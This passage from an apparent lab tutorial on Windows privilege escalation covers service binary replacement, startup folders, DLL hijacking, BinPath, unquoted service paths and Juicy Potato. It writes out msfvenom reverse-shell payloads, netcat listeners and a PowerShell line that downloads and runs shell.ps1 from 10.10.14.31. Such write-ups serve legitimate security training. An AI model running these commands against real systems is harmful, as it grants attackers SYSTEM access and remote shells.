fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>powershell <span class="nt">-ep</span> bypass
<span class="gp">PS C:\Temp&gt;</span><span class="nb">.</span> .<span class="se">\P</span>owerUp.sp1
<span class="gp">PS C:\Temp&gt;</span><span class="w"> </span>Invoke-AllChecks
</pre></table></code></div></div></ol><p><img data-src="https://user-images.githubusercontent.com/59029171/161047964-59d53aa2-ebd2-4cb3-85e7-5e103e19c4e1.png" alt="image" data-proofer-ignore></p><p>We can see that we have Modifiable File access to <code class="language-plaintext highlighter-rouge">"c:\Program Files\File Permissions Service\filepermservice.exe"</code>. To gain administrator access, we can drop our malicious executable file on this location.</p><h2 id="exploitation-3"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Exploitation</span></span><a href="#exploitation-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="kali-vm-6"><span class="mr-2">Kali VM</span><a href="#kali-vm-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Start a netcat listener<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nc <span class="nt">-nvlp</span> 53
</pre></table></code></div></div><li>Open an additional command prompt and type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=[</span>tun0 IP] <span class="nv">LPORT</span><span class="o">=</span>53 <span class="nt">-f</span> exe <span class="nt">-o</span> x.exe
</pre></table></code></div></div><li>Copy the generated file <code class="language-plaintext highlighter-rouge">x.exe</code>, to the Windows VM and replace it over <code class="language-plaintext highlighter-rouge">filepermsvc.exe</code>.</ol><h3 id="windows-vm-5"><span class="mr-2">Windows VM</span><a href="#windows-vm-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>In command prompt type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>sc start filepermsvc
</pre></table></code></div></div></ol><h3 id="kali-vm-7"><span class="mr-2">Kali VM</span><a href="#kali-vm-7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Wait for a reverse shell on your kali machine.</ol><h1 id="startup-applications"><span style="color:lightblue">Startup Applications</span></h1><h2 id="methodology-4"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology</span></span><a href="#methodology-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Startup apps run in the background, the number of apps running on the system can be significantly more than what the user is aware of and affect system responsiveness. Startup apps are classified to include those leveraging these mechanisms to start:</p><ul><li>Run registry keys (HKLM, HKCU, wow64 nodes included)<li>RunOnce registry keys<li>Startup folders under the start menu for per user and public locations</ul><p>So basically, we need full access to the Startup folder. Then by dropping our malicious executable file, we will gain administrator access.</p><h2 id="detection-4"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Detection</span></span><a href="#detection-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="windows-vm-6"><span class="mr-2">Windows VM</span><a href="#windows-vm-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Open command prompt and type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>icacls.exe <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">tart Menu</span><span class="se">\P</span><span class="s2">rograms</span><span class="se">\S</span><span class="s2">tartup"</span>
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/161051050-c4b5745a-3040-4d65-8146-e67d66a3ffd3.png" alt="image" data-proofer-ignore></p><li>From the output notice that the <code class="language-plaintext highlighter-rouge">"BUILTIN\Users"</code> group has full access <code class="language-plaintext highlighter-rouge">'(F)'</code> to the directory.</ol><h2 id="exploitation-4"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Exploitation</span></span><a href="#exploitation-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="kali-vm-8"><span class="mr-2">Kali VM</span><a href="#kali-vm-8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Start a netcat listener<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nc <span class="nt">-nvlp</span> 53
</pre></table></code></div></div><li>Open an additional command prompt and type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=[</span>tun0 IP] <span class="nv">LPORT</span><span class="o">=</span>53  <span class="nt">-f</span> exe <span class="nt">-o</span> y.exe
</pre></table></code></div></div><li>Copy the generated file, <code class="language-plaintext highlighter-rouge">y.exe</code>, to the Windows VM.</ol><h3 id="windows-vm-7"><span class="mr-2">Windows VM</span><a href="#windows-vm-7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Place <code class="language-plaintext highlighter-rouge">y.exe</code> in <code class="language-plaintext highlighter-rouge">"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"</code>.</ol><h3 id="kali-vm-9"><span class="mr-2">Kali VM</span><a href="#kali-vm-9" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Wait for a reverse shell on your kali machine.</ol><h1 id="dll-hijacking"><span style="color:lightblue">DLL Hijacking</span></h1><h2 id="methodology-5"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology</span></span><a href="#methodology-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Windows applications usually load DLL files when started. It may happen that a DLL file does not exist and the application is unable to load it. Nevertheless, an application will continue to execute as long as the missing DLL is not needed.<br /> In case the application uses a relative and not an absolute file path, Windows searches for the file in the following directories:</p><ul><li>The directory from which the application is loaded<li><code class="language-plaintext highlighter-rouge">C:\Windows\System32</code><li><code class="language-plaintext highlighter-rouge">C:\Windows\System</code><li><code class="language-plaintext highlighter-rouge">C:\Windows</code><li>The current working directory<li>Directories in the system PATH environment variable<li>Directories in the user PATH environment variable</ul><h3 id="steps-taken-to-perform-dll-hijacking-are-outlined-below"><span class="mr-2">Steps taken to perform DLL hijacking are outlined below.</span><a href="#steps-taken-to-perform-dll-hijacking-are-outlined-below" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Identify vulnerable application and location<li>Identify applications PID<li>Identify vulnerable DLLs that can be hijacked<li>Use MSFVenom or other payload creation tools to create a malicious DLL<li>Replace the original DLL with the malicious DLL<li>Profit</ol><h2 id="detection-5"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Detection</span></span><a href="#detection-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="windows-vm-rdp-is-required"><span class="mr-2">Windows VM (RDP is required)</span><a href="#windows-vm-rdp-is-required" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Transfer <a href="https://strontic.github.io/xcyclopedia/library/Procmon.exe-EB2A0D7AC44B9B66E884EE5087305ACC.html">Procmon.exe</a> on the Windows VM<li>Right click on <code class="language-plaintext highlighter-rouge">Procmon.exe</code> and select <code class="language-plaintext highlighter-rouge">'Run as administrator'</code> from the menu.<li>In procmon, select <code class="language-plaintext highlighter-rouge">"filter"</code>. From the left-most drop down menu, select <code class="language-plaintext highlighter-rouge">'Process Name'</code>.<li>In the input box on the same line type: <code class="language-plaintext highlighter-rouge">dllhijackservice.exe</code><li>Make sure the line reads “Process Name is <code class="language-plaintext highlighter-rouge">dllhijackservice.exe</code> then Include” and click on the <code class="language-plaintext highlighter-rouge">'Add'</code> button, then <code class="language-plaintext highlighter-rouge">'Apply'</code> and lastly on ‘OK’.<li>Next, select from the left-most drop down menu <code class="language-plaintext highlighter-rouge">'Result'</code>.<li>In the input box on the same line type: <code class="language-plaintext highlighter-rouge">NAME NOT FOUND</code>.<li>Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the <code class="language-plaintext highlighter-rouge">'Add'</code> button, then <code class="language-plaintext highlighter-rouge">'Apply'</code> and lastly on ‘OK’.</ol><p><img data-src="https://user-images.githubusercontent.com/59029171/161053850-6638a245-75dd-43ea-bbe9-6fecd33ad4c5.png" alt="image" data-proofer-ignore> <img data-src="https://user-images.githubusercontent.com/59029171/161053869-d2daa643-a03a-4956-a2f0-d5e74457d816.png" alt="image" data-proofer-ignore></p><ol><li>Open command prompt and type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>sc start dllsvc
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/161053895-44130b44-4f86-4fe7-8ed2-0f9721fb5896.png" alt="image" data-proofer-ignore></p><li>Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute <code class="language-plaintext highlighter-rouge">'C:\Temp\hijackme.dll'</code> yet it could not do that as the file was not found. Note that <code class="language-plaintext highlighter-rouge">'C:\Temp'</code> is a writable location. <img data-src="https://user-images.githubusercontent.com/59029171/161053920-4af50faa-c6ec-487e-9ec5-142907940e3c.png" alt="image" data-proofer-ignore></ol><h2 id="exploitation-5"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Exploitation</span></span><a href="#exploitation-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="kali-vm-10"><span class="mr-2">Kali VM</span><a href="#kali-vm-10" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Start a netcat listener<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nc <span class="nt">-nvlp</span> 53
</pre></table></code></div></div><li>Open an additional command prompt and type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=[</span>tun0 IP] <span class="nv">LPORT</span><span class="o">=</span>53 <span class="nt">-f</span> dll <span class="nt">-o</span> hijackme.dll
</pre></table></code></div></div><li>Copy the generated file <code class="language-plaintext highlighter-rouge">hijackme.dll</code>, to the Windows VM.</ol><h3 id="windows-vm-8"><span class="mr-2">Windows VM</span><a href="#windows-vm-8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Place <code class="language-plaintext highlighter-rouge">hijackme.dll</code> in<code class="language-plaintext highlighter-rouge"> 'C:\Temp'</code><li>Open command prompt and type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>sc stop dllsvc &amp; sc start dllsvc
</pre></table></code></div></div></ol><h3 id="kali-vm-11"><span class="mr-2">Kali VM</span><a href="#kali-vm-11" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Wait for a reverse shell on your kali machine.</ol><h1 id="binpath"><span style="color:lightblue">BinPath</span></h1><h2 id="methodology-6"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology</span></span><a href="#methodology-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>BinPath is a type of Service Escalation. We can gain administrator privileges if we write access and restart access on any service. We can abuse this function by injecting our malicious BinPath to get executed once restarted.</p><h2 id="detection-6"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Detection</span></span><a href="#detection-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="using-script-on-windows-vm"><span class="mr-2">Using Script on Windows VM</span><a href="#using-script-on-windows-vm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Run Powerup.ps1 and Run <code class="language-plaintext highlighter-rouge">Invoke-AllChecks</code> (check the service permissions field)</ol><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>powershell <span class="nt">-ep</span> bypass
<span class="gp">PS C:\Temp&gt;</span><span class="nb">.</span> .<span class="se">\P</span>owerUp.sp1
<span class="gp">PS C:\Temp&gt;</span><span class="w"> </span>Invoke-AllChecks
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/161123056-908dbaa0-fced-490f-a158-9d2f20661d31.png" alt="image" data-proofer-ignore></p><h3 id="checking-manually-on-windows-vm"><span class="mr-2">Checking manually on Windows VM</span><a href="#checking-manually-on-windows-vm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Run <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk64.exe</a></ol><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>accesschk64.exe <span class="nt">-uwcv</span> Everyone <span class="k">*</span>
<span class="go">
</span><span class="gp">#</span><span class="w"> </span>Switch meaning
<span class="gp">#</span><span class="w"> </span>w <span class="nt">--</span><span class="o">&gt;</span> only show items that have write access
<span class="gp">#</span><span class="w"> </span>v <span class="nt">--</span><span class="o">&gt;</span> verbose<span class="p">;</span> dispaly as many details as possible
<span class="gp">#</span><span class="w"> </span>u <span class="nt">--</span><span class="o">&gt;</span> ignore the errors
<span class="gp">#</span><span class="w"> </span>c <span class="nt">--</span><span class="o">&gt;</span> displays service name of the following
<span class="gp">#</span><span class="w"> </span>Everyone <span class="nt">--</span><span class="o">&gt;</span> means everyone as a group <span class="nb">who </span>hass access
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/161123809-4f85ab02-1d83-46a8-8f9c-2be2fc85a43d.png" alt="image" data-proofer-ignore></p><ol><li>Using <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk64.exe</a> query the service found<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>accesschk64.exe <span class="nt">-uwcv</span> daclsvc
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/161124072-a5fb8b5e-5d0c-4cf5-8551-f63b33ad4b9d.png" alt="image" data-proofer-ignore></p><li>Find path of the bin file<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>sc qc daclsvc
</pre></table></code></div></div></ol><p><img data-src="https://user-images.githubusercontent.com/59029171/161124205-51cf18ef-d3a8-457d-b65a-1545c310c7b9.png" alt="image" data-proofer-ignore></p><h2 id="exploitation-6"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Exploitation</span></span><a href="#exploitation-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="kali-vm-12"><span class="mr-2">Kali VM</span><a href="#kali-vm-12" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Start a netcat listener<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nc <span class="nt">-nvlp</span> 53
</pre></table></code></div></div><li>Open an additional command prompt and type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=[</span>tun0 IP] <span class="nv">LPORT</span><span class="o">=</span>53 <span class="nt">-f</span> exe <span class="nt">-o</span> reverse.exe
</pre></table></code></div></div><li>Copy the generated file <code class="language-plaintext highlighter-rouge">reverse.exe</code>, to the Windows VM.</ol><h3 id="windows-vm-9"><span class="mr-2">Windows VM</span><a href="#windows-vm-9" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Place <code class="language-plaintext highlighter-rouge">reverse.exe</code> in<code class="language-plaintext highlighter-rouge"> 'C:\Temp'</code><li>In command prompt type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>sc config daclsvc <span class="nv">binpath</span><span class="o">=</span> <span class="s2">"C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\r</span><span class="s2">everse.exe"</span>
</pre></table></code></div></div><li>In command prompt type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>sc start daclsvc
</pre></table></code></div></div></ol><h3 id="kali-vm-13"><span class="mr-2">Kali VM</span><a href="#kali-vm-13" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Wait for a reverse shell on your kali machine.</ol><h1 id="unquoted-service-paths"><span style="color:lightblue">Unquoted Service Paths</span></h1><h2 id="methodology-7"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology</span></span><a href="#methodology-7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege).</p><p>In Windows, if the service is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument.</p><h2 id="detection-7"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Detection</span></span><a href="#detection-7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Run Powerup.ps1 and Run <code class="language-plaintext highlighter-rouge">Invoke-AllChecks</code> (check the unquoted service field)<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>powershell <span class="nt">-ep</span> bypass
<span class="gp">PS C:\Temp&gt;</span><span class="nb">.</span> .<span class="se">\P</span>owerUp.sp1
<span class="gp">PS C:\Temp&gt;</span><span class="w"> </span>Invoke-AllChecks
</pre></table></code></div></div></ol><p><img data-src="https://user-images.githubusercontent.com/59029171/161141363-e21f53f1-1e4c-4006-ade0-b30e7286f4af.png" alt="image" data-proofer-ignore></p><h2 id="exploitation-7"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Exploitation</span></span><a href="#exploitation-7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="kali-vm-14"><span class="mr-2">Kali VM</span><a href="#kali-vm-14" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Start a netcat listener<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nc <span class="nt">-nvlp</span> 53
</pre></table></code></div></div><li>Open an additional command prompt and type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=[</span>tun0 IP] <span class="nv">LPORT</span><span class="o">=</span>53 <span class="nt">-f</span> exe <span class="nt">-o</span> common.exe
</pre></table></code></div></div><li>Transfer the generated file, <code class="language-plaintext highlighter-rouge">common.exe</code>, to the Windows VM.</ol><h3 id="windows-vm-10"><span class="mr-2">Windows VM</span><a href="#windows-vm-10" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Place <code class="language-plaintext highlighter-rouge">common.exe</code> in <code class="language-plaintext highlighter-rouge">'C:\Program Files\Unquoted Path Service'</code>.<li>Open command prompt and type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>sc start unquotedsvc
<span class="gp">#</span><span class="w"> </span>OR
<span class="gp">C:\Temp&gt;</span><span class="w"> </span>net start unquotedsvc
</pre></table></code></div></div></ol><h3 id="kali-vm-15"><span class="mr-2">Kali VM</span><a href="#kali-vm-15" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Wait for a reverse shell on your kali machine.</ol><h1 id="juicy-potato-attack"><span style="color:lightblue">Juicy potato attack</span></h1><h2 id="methodology-8"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology</span></span><a href="#methodology-8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This privilege allows us to impersonate a token of a privileged account such as NT AUTHORITY\SYSTEM.</p><h2 id="detection-8"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Detection</span></span><a href="#detection-8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="windows-vm-11"><span class="mr-2">Windows VM</span><a href="#windows-vm-11" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>We should have <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> privileges enabled<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="nb">whoami</span> /priv
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/161144004-97322646-a231-4fef-afd8-239570f44f8c.png" alt="image" data-proofer-ignore></p></ol><h2 id="exploitation-8"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Exploitation</span></span><a href="#exploitation-8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="kali-vm-16"><span class="mr-2">Kali VM</span><a href="#kali-vm-16" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Copy <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp.ps1</code> from <a href="https://github.com/samratashok/nishang/tree/master/Shells">nishang</a> shells as <code class="language-plaintext highlighter-rouge">shell.ps1</code><li>Add the line at the bottom of <code class="language-plaintext highlighter-rouge">shell.ps1</code><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.31 -Port 9999
</span></pre></table></code></div></div><li>Lets create a <code class="language-plaintext highlighter-rouge">shell.bat</code> file<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.31/shell.ps1')
</span></pre></table></code></div></div><li>Transfer <code class="language-plaintext highlighter-rouge">shell.bat</code> and <code class="language-plaintext highlighter-rouge">juicypotato.exe</code> on victim machine<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
